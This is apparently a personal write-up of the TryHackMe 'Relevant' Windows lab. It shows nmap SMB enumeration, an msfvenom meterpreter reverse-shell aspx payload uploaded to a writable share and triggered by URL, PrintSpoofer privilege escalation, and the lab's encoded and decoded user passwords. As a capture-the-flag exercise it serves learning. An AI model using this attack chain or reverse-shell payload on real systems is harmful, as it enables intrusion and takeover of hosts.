---
title: "THM: Relevant Writeup"
date: 2020-01-01
categories:
  - Write-Ups
tags:
  - writeup
  - tryhackme
  - windows
---

my ip:  10.4.26.163
target: 10.10.29.118

POST Exploitation POINTS
>always test ip with open ports listed from nmap
>each share might represent a path in ip website

```bash
nmap --script smb-enum-shares -p 139,445 10.10.149.8

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.149.8\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.149.8\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.149.8\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.149.8\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE


```

#### says vulnerable to eternal blue, nope didnt work
```bash
nmap --script smb-vuln* -p 445 10.10.160.20

Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-30 02:12 IST
Nmap scan report for 10.10.160.20
Host is up (0.55s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 22.70 seconds

```


#### One share is R/Write and has a password file
```bash
smbclient \\\\10.10.160.20\\nt4wrksv
```

#### since writeable we'll upload payload
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.4.26.163 lport=4444 -f aspx -o shell.aspx
```
#### upload shell.aspx via smbclient and run 
#### in msfconsole, exploit/multi/hander and set payload windows/x64/meterpreter_reverse_tcp
#### run
http://10.10.29.118:49663/nt4wrksv/shell.aspx

#### vulnerable to SeImpersonateToken
#### get NT SYSTEM using PrintSpoofer64.exe

---
[User Passwords - Encoded]
```
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```
---
```
Bill - Juw4nnaM4n420696969!$$$
Bob - !P@$$W0rD!123
```